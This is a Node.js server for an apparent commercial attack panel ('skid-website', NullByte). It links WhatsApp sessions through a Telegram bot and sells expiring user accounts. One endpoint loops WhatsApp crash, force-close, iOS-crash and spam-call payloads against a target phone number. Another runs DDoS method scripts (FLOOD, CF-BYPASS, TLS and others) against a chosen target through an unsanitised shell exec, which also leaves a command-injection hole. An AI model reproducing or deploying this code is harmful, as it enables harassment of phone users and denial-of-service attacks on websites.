const { Token, owner } = require("./settings/config");
const express = require("express");
const fs = require("fs");
const url = require('url');
const path = require("path");
const cookieParser = require('cookie-parser');
const { exec } = require('child_process');
const cors = require('cors');
const crypto = require('crypto');
const {
    default: makeWASocket,
    makeInMemoryStore,
    useMultiFileAuthState,
    useSingleFileAuthState,
    initInMemoryKeyStore,
    fetchLatestBaileysVersion,
    makeWASocket: WASocket,
    getGroupInviteInfo,
    AuthenticationState,
    BufferJSON,
    downloadContentFromMessage,
    downloadAndSaveMediaMessage,
    generateWAMessage,
    generateMessageID,
    generateWAMessageContent,
    encodeSignedDeviceIdentity,
    generateWAMessageFromContent,
    prepareWAMessageMedia,
    getContentType,
    mentionedJid,
    relayWAMessage,
    templateMessage,
    InteractiveMessage,
    Header,
    MediaType,
    MessageType,
    MessageOptions,
    MessageTypeProto,
    WAMessageContent,
    WAMessage,
    WAMessageProto,
    WALocationMessage,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMediaUpload,
    WAMessageStatus,
    WA_MESSAGE_STATUS_TYPE,
    WA_MESSAGE_STUB_TYPES,
    Presence,
    emitGroupUpdate,
    emitGroupParticipantsUpdate,
    GroupMetadata,
    WAGroupMetadata,
    GroupSettingChange,
    areJidsSameUser,
    ChatModification,
    getStream,
    isBaileys,
    jidDecode,
    processTime,
    ProxyAgent,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    Browsers,
    Browser,
    WAFlag,
    WAContextInfo,
    WANode,
    WAMetric,
    Mimetype,
    MimetypeMap,
    MediaPathMap,
    isJidUser,
    DisconnectReason,
    MediaConnInfo,
    ReconnectMode,
    AnyMessageContent,
    waChatKey,
    WAProto,
    BaileysError,
} = require('@whiskeysockets/baileys');
const pino = require("pino");
const { Telegraf, Markup } = require("telegraf");

const app = express();
const PORT = process.env.PORT || 2451;

app.use(express.json());
app.use(express.static('public'));
app.use(cookieParser());
app.use(cors());

app.use(express.static(path.join(__dirname, 'public')));

const sessions = new Map();
const file_session = "./sessions.json";
const sessions_dir = "./sessions";
const bot = new Telegraf(Token);

let dim;

let maintenanceMode = false;
let totalRequests = 0;

setInterval(() => {
  totalRequests = 0;
}, 5000);

app.use(async (req, res, next) => {
  if (maintenanceMode) {
    return res.status(503).sendFile(path.join(__dirname, 'public', '503.html'));
  }

  totalRequests++;

  if (totalRequests >= 1000000) {
    maintenanceMode = true;

    const message = encodeURIComponent(
      'Dangerous!\nServer reaches 1,000,000 requests per 5 seconds auto 503'
    );

    const url = `https://api.telegram.org/bot${Token}/sendMessage?chat_id=${owner}&text=${message}`;
    fetch(url)
      .then(r => console.log('Telegram notification sent'))
      .catch(err => console.error('Telegram notification failed', err));

    console.log('Threshold reached! Maintenance mode ON.');

    return res.status(503).sendFile(path.join(__dirname, 'public', '503.html'));
  }

  next();
});

setInterval(() => {
  if (maintenanceMode) {
    maintenanceMode = false;
    console.log('Server recovered. Maintenance mode OFF.');
  }
}, 60000);

const loadAccounts = () => {
  return fs.existsSync('./db/db.json') ? JSON.parse(fs.readFileSync('./db/db.json')) : [];
};

const isAccountExpired = (date) => {
  if (!date) return false;
  return new Date(date).getTime() < Date.now();
};

const generateToken = (user) => {
  const payload = {
    username: user.username,
    role: user.role,
    timestamp: Date.now()
  };
  return Buffer.from(JSON.stringify(payload)).toString('base64');
};

const verifyToken = (token) => {
  try {
    const payload = JSON.parse(Buffer.from(token, 'base64').toString());
    const accounts = loadAccounts();
    const user = accounts.find(acc => acc.username === payload.username);
    return user ? payload : null;
  } catch (error) {
    return null;
  }
};

const requireAuth = (req, res, next) => {
  const token = req.headers.authorization?.replace('Bearer ', '');
  const payload = verifyToken(token);
  if (!payload) {
    return res.status(401).json({ success: false, message: 'Unauthorized' });
  }
  req.user = payload;
  next();
};

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

app.get('/home', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/track', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'track.html'));
});

app.get('/bug', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'bug.html'));
});

app.get('/ddos', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'ddos.html'));
});

app.get('/contac', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'contac.html'));
});

app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  const accounts = loadAccounts();
  const user = accounts.find(acc => acc.username === username && acc.password === password);

  if (!user) {
    return res.status(401).json({ success: false, message: 'Invalid credentials' });
  }

  if (isAccountExpired(user.expired)) {
    const updatedAccounts = accounts.filter(acc => acc.username !== username);
    fs.writeFileSync('./acc.json', JSON.stringify(updatedAccounts, null, 2));
    return res.status(401).json({ success: false, message: 'Account has expired' });
  }

  const validRole = ['ADMIN', 'VIP'].includes(user.role.toUpperCase()) ? user.role.toUpperCase() : 'VIP';
  const token = generateToken(user);

  res.json({
    success: true,
    token,
    user: { username: user.username, role: validRole, expired: user.expired }
  });
});

app.post('/api/logout', requireAuth, (req, res) => {
  res.json({ success: true, message: 'Logged out' });
});

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

const saveActive = (botNumber) => {
  const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
  if (!list.includes(botNumber)) {
    list.push(botNumber);
    fs.writeFileSync(file_session, JSON.stringify(list));
  }
};

const sessionPath = (botNumber) => {
  const dir = path.join(sessions_dir, `device${botNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

const initializeWhatsAppConnections = async () => {
  if (!fs.existsSync(file_session)) return;
  const activeNumbers = JSON.parse(fs.readFileSync(file_session));
  console.log(`Found ${activeNumbers.length} active WhatsApp sessions`);

  for (const botNumber of activeNumbers) {
    console.log(`Connecting WhatsApp: ${botNumber}`);
    const sessionDir = sessionPath(botNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    dim = makeWASocket({
      auth: state,
      printQRInTerminal: true,
      logger: pino({ level: "silent" }),
      defaultQueryTimeoutMs: undefined,
    });

    await new Promise((resolve, reject) => {
      dim.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        if (connection === "open") {
          console.log(`Bot ${botNumber} connected!`);
          sessions.set(botNumber, dim);
          return resolve();
        }
        if (connection === "close") {
          const reconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
          reconnect ? await initializeWhatsAppConnections() : reject(new Error("Koneksi ditutup"));
        }
      });
      dim.ev.on("creds.update", saveCreds);
    });
  }
};

const connectToWhatsApp = async (botNumber, chatId, ctx) => {
  const sessionDir = sessionPath(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  let statusMessage = await ctx.reply(`pairing with number *${botNumber}*...`, {
    parse_mode: "Markdown"
  });

  const editStatus = async (text) => {
    try {
      await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, text, {
        parse_mode: "Markdown"
      });
    } catch (e) {
      console.error("Error:", e.message);
    }
  };

  let paired = false;

  dim = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  dim.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "connecting") {
      if (!fs.existsSync(`${sessionDir}/creds.json`)) {
        setTimeout(async () => {
          try {
            const code = await dim.requestPairingCode(botNumber);
            const formatted = code.match(/.{1,4}/g)?.join("-") || code;
            await editStatus(makeCode(botNumber, formatted));
          } catch (err) {
            console.error("Error requesting code:", err);
            await editStatus(makeStatus(botNumber, `❗ ${err.message}`));
          }
        }, 3000);
      }
    }

    if (connection === "open" && !paired) {
      paired = true;
      sessions.set(botNumber, dim);
      saveActive(botNumber);
      await editStatus(makeStatus(botNumber, "✅ Connected successfully."));
    }

    if (connection === "close") {
      const code = lastDisconnect?.error?.output?.statusCode;
      if (code !== DisconnectReason.loggedOut && code >= 500) {
        console.log("Reconnect diperlukan untuk", botNumber);
        setTimeout(() => connectToWhatsApp(botNumber, chatId, ctx), 2000);
      } else {
        await editStatus(makeStatus(botNumber, "❌ Failed to connect."));
        fs.rmSync(sessionDir, { recursive: true, force: true });
      }
    }
  });

  dim.ev.on("creds.update", saveCreds);
  return dim;
};

const makeStatus = (number, status) => 
  `*Status Pairing*\nNomor: \`${number}\`\nStatus: ${status}`;

const makeCode = (number, code) =>
  `*Kode Pairing*\nNomor: \`${number}\`\nKode: \`${code}\``;

const DB_FILE = "./db/db.json";
let db = fs.existsSync(DB_FILE) ? JSON.parse(fs.readFileSync(DB_FILE)) : [];

const AUTH_FILE = "./db/auth.json";
let authorized = fs.existsSync(AUTH_FILE) ? JSON.parse(fs.readFileSync(AUTH_FILE)) : [];

function saveDB() {
  fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2));
}
function saveAuth() {
  fs.writeFileSync(AUTH_FILE, JSON.stringify(authorized, null, 2));
}

function checkAuth(ctx) {
  ctx.isOwner = ctx.from?.id?.toString() === owner;
  ctx.isAuthorized = ctx.isOwner || authorized.includes(ctx.from?.id?.toString());
}

bot.use(async (ctx, next) => {
  ctx.isOwner = ctx.from?.id?.toString() === owner;
  return next();
});

bot.start((ctx) => {
  ctx.replyWithVideo(
    { url: 'https://files.catbox.moe/vwyf36.mp4' },
    {
      caption: `
welcome to skid-website, i can only help with this

╭─────────
│ 🔹 /pairing <number>
│ 🔹 /listpairing
│ 🔹 /delpairing <number>
│ 🔹 /address <id>
│ 🔹 /delress <id>
│ 🔹 /addakun
│ 🔹 /listakun
│ 🔹 /delakun <username> <password>
╰──────────`,
      parse_mode: 'Markdown',
      ...Markup.inlineKeyboard([
        [Markup.button.url('👤 Owner', 'https://t.me/komodigi')],
        [Markup.button.url('📢 Join Channel', 'https://t.me/xpcommuniti')]
      ])
    }
  );
});

bot.command("pairing", async (ctx) => {
  if (!ctx.isOwner) return ctx.reply("❌ You don't have access.");
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Use: `/pairing <number>`", { parse_mode: "Markdown" });
  const botNumber = args[1];
  await ctx.reply(`⏳ Starting pairing to number ${botNumber}...`);
  await connectToWhatsApp(botNumber, ctx.chat.id, ctx);
});

bot.command("listpairing", (ctx) => {
  if (!ctx.isOwner) return ctx.reply("❌ You don't have access.");
  if (sessions.size === 0) return ctx.reply("no active sender.");
  const list = [...sessions.keys()].map(n => `• ${n}`).join("\n");
  ctx.reply(`*Active Sender List:*\n${list}`, { parse_mode: "Markdown" });
});

bot.command("delpairing", async (ctx) => {
  if (!ctx.isOwner) return ctx.reply("❌ You don't have access.");
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Use: /delpairing 628xxxx");

  const number = args[1];
  if (!sessions.has(number)) return ctx.reply("Sender not found.");

  try {
    const sessionDir = sessionPath(number);
    sessions.get(number).end();
    sessions.delete(number);
    fs.rmSync(sessionDir, { recursive: true, force: true });

    const data = JSON.parse(fs.readFileSync(file_session));
    const updated = data.filter(n => n !== number);
    fs.writeFileSync(file_session, JSON.stringify(updated));

    ctx.reply(`Sender ${number} successfully deleted.`);
  } catch (err) {
    console.error(err);
    ctx.reply("Failed to delete sender.");
  }
});

bot.command("address", (ctx) => {
  if (!ctx.isOwner) return ctx.reply("❌ Not authorized.");
  const parts = ctx.message.text.split(" ");
  const tgId = parts[1];
  if (!tgId) return ctx.reply("❌ Usage: /address <id>");
  if (authorized.includes(tgId)) return ctx.reply("⚠️ User already registered.");
  authorized.push(tgId);
  saveAuth();
  ctx.reply(`✅ User ${tgId} has been granted access.`);
});

bot.command("listakun", (ctx) => {
  checkAuth(ctx);
  if (!ctx.isAuthorized) return ctx.reply("❌ You are not authorized.");
  if (db.length === 0) return ctx.reply("📂 No accounts available.");

  let msg = "📜 Accounts:\n\n";
  db.forEach((acc, i) => {
    msg += `#${i}\n👤 ${acc.username}\n🎭 ${acc.role}\n⏳ ${acc.expired}\n\n`;
  });
  ctx.reply(msg);
});

let addStep = {};
bot.command("addakun", (ctx) => {
  checkAuth(ctx);
  if (!ctx.isAuthorized) return ctx.reply("❌ You are not authorized.");

  addStep[ctx.from.id] = { step: 1, data: {} };
  ctx.reply("👤 Send username:");
});

bot.on("text", (ctx) => {
  checkAuth(ctx);
  if (!ctx.isAuthorized) return;
  const step = addStep[ctx.from.id];
  if (!step) return;

  if (step.step === 1) {
    step.data.username = ctx.message.text.trim();
    step.step = 2;
    ctx.reply("🔑 Send password:");
  } else if (step.step === 2) {
    step.data.password = ctx.message.text.trim();
    step.step = 3;
    ctx.reply("🎭 Send role (ADMIN/VIP):");
  } else if (step.step === 3) {
    step.data.role = ctx.message.text.trim().toUpperCase();
    step.step = 4;
    ctx.reply("⏳ Send expired date (YYYY-MM-DD):");
  } else if (step.step === 4) {
    step.data.expired = new Date(ctx.message.text.trim()).toISOString();
    db.push(step.data);
    saveDB();
    ctx.reply(`✅ Account *${step.data.username}* added.`, { parse_mode: "Markdown" });
    delete addStep[ctx.from.id];
  }
});

bot.command("delakun", (ctx) => {
  checkAuth(ctx);
  if (!ctx.isAuthorized) return ctx.reply("❌ You are not authorized.");

  const parts = ctx.message.text.split(" ");
  if (parts.length < 3) {
    return ctx.reply("❌ Usage: /delakun <username> <password>");
  }

  const username = parts[1];
  const password = parts[2];

  const index = db.findIndex(acc => acc.username === username && acc.password === password);

  if (index === -1) {
    return ctx.reply("⚠️ Account not found or credentials do not match.");
  }

  const removed = db.splice(index, 1);
  saveDB();
  ctx.reply(`🗑️ Account **${removed[0].username}** deleted successfully.`, { parse_mode: "Markdown" });
});

bot.command("delress", (ctx) => {
  if (!ctx.isOwner) return ctx.reply("❌ Not authorized.");
  const parts = ctx.message.text.split(" ");
  const tgId = parts[1];
  if (!tgId) return ctx.reply("❌ Usage: /delress <id>");
  authorized = authorized.filter((id) => id !== tgId);
  saveAuth();
  ctx.reply(`🗑️ User ${tgId} access revoked.`);
});

// fangsion kamyuh🤭


app.get("/attack/metode", requireAuth,  async (req, res) => {
  try {
    const metode = req.query.metode;
    const target = req.query.target;

    if (!metode || !target) {
      return res.status(400).json({ status: false, message: "'metode' and 'target' required" });
    }

    const isTarget = target.replace(/\D/g, "") + "@s.whatsapp.net";

    if (sessions.size === 0) {
      return res.status(400).json({ status: false, message: "No active sender" });
    }

    const botNumber = [...sessions.keys()][0];
    const sock = sessions.get(botNumber);
    if (!sock) {
      return res.status(400).json({ status: false, message: "Socket not found" });
    }

    switch (metode.toLowerCase()) {
      case "crash":
        for (let i = 0; i < 40; i++) {
          await payXgtw(dim, isTarget);
        }
        break;

      case "foreclose":
        for (let i = 0; i < 40; i++) {
          await FcBeta(sock, isTarget);
          await CallUi(sock, isTarget);
          await fccil(sock, isTarget);
        }
        break;

      case "blank":
        for (let i = 0; i < 40; i++) {
          await blankPayload(sock, isTarget);
        }
        break;

      case "ios":
        for (let i = 0; i < 40; i++) {
          await iosInVis(sock, isTarget);
          await crashNewIos(sock, isTarget);
          await fccil(sock, isTarget);
        }
        break;

      case "delay":
        for (let i = 0; i < 300; i++) {
          await yyyyy(dim, isTarget);
        }
        break;

      case "call":
        for (let i = 0; i < 40; i++) {
          await SpamCall(sock, isTarget);
        }
        break;

      case "combo":
        for (let i = 0; i < 40; i++) {
          await FcBeta(sock, isTarget);
          await CallUi(sock, isTarget);
          await fccil(sock, isTarget);
          await iosInVis(sock, isTarget);
          await crashNewIos(sock, isTarget);
        }
        break;

      default:
        return res.status(400).json({ status: false, message: "Metode tidak dikenali" });
    }

    return res.json({ status: 200, target: target, metode: metode.toLowerCase(), result: "sukses" });

  } catch (err) {
    console.error("Gagal kirim:", err);
    return res.status(500).json({ status: false, message: "Feature Under Construction" });
  }
});

app.post("/ddos", requireAuth, async (req, res) => {
  try {
    const { key, metode, target, time } = req.body;

    if (!key || !metode || !target || !time) {
      return res.status(400).json({
        status: false,
        message: "Required parameters: key, metode, target, time"
      });
    }

    if (key !== "NullByte") {
      return res.status(403).json({
        status: false,
        message: "Incorrect API key"
      });
    }

    const duration = parseInt(time);
    if (isNaN(duration) || duration < 1 || duration > 500) {
      return res.status(400).json({
        status: false,
        message: "Time must be 1 - 500 seconds"
      });
    }

    const validMethods = [
      "BYPASS", "CIBI", "FLOOD", "GLORY",
      "HTTPS", "HTTPX", "HTTP-X", "RAW",
      "TLS", "UAM", "CF", "H2", "CF-BYPASS"
    ];

    if (!validMethods.includes(metode)) {
      return res.status(400).json({
        status: false,
        message: "Method not supported"
      });
    }

    const command = `node ${metode}.js ${target} ${duration}`;
    exec(command, {
      cwd: path.join(__dirname, "methods"),
      timeout: (duration + 10) * 1000
    }, (error, stdout, stderr) => {
      if (error) console.error(`Command error: ${error.message}`);
      if (stderr) console.warn(`Command stderr: ${stderr}`);
      if (stdout) console.log(`Command output: ${stdout}`);
    });

    return res.json({
      status: true,
      Target: target,
      Methods: metode,
      Time: duration,
      Message: "Attack successfully"
    });

  } catch (err) {
    console.error("DDoS endpoint error:", err);
    return res.status(500).json({
      status: false,
      message: "Internal server error"
    });
  }
});

app.use((req, res, next) => {
  res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
});

app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).json({
    success: false,
    message: 'Internal Server Error'
  });
});

initializeWhatsAppConnections();
bot.launch();

app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Server is running on port ${PORT}`);
  console.log(` Access dashboard: https://nullbyte.space/dashboard`);
  console.log(` Access DDOS panel: https://nullbyte.space/ddos-dashboard`);
  console.log(` Public URL: https://nullbyte.space/`);
});

